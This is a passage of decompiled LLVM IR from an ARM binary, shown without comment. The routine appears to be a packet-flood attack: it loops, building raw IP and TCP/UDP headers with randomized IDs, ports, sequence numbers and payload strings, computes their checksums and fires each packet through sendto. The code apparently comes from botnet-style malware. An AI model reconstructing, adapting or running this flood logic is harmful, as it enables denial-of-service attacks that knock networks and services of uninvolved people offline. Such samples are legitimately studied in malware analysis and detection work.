  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* @r4, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* @r4, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* @r4, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* @r4, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* @r4, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* @r4, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* %r0.global-to-local, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* @r4, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = inttoptr i32 %v1_accc to i16*
  %v3_acd4 = call i32 @rand_str(i16* %v2_acd4, i32 %v6_aa14)
  store i32 %v3_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v3_aea8 = icmp eq i32 %v3_aaac, 65535
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ 65535, %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v6_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v6_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, 65280
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v5_ae68 = call i32 @llvm.bswap.i32(i32 %v3_ae38)
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v6_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v6_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* %r0.global-to-local, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v2_af20 = inttoptr i32 %v1_af18 to i16*
  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 2, 1, 3, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_aea8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
